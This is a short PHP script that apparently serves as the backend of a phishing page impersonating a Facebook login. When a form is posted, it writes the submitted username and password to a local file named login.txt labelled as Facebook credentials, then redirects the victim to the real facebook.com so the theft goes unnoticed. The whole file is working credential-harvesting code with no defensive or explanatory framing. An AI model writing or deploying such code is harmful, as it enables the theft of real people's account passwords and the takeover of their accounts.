<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? '';
    $pass = $_POST['passw'] ?? '';

    $log = "Facebook Username: $username | Pass: $pass\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://facebook.com/');
    exit();
}
?>
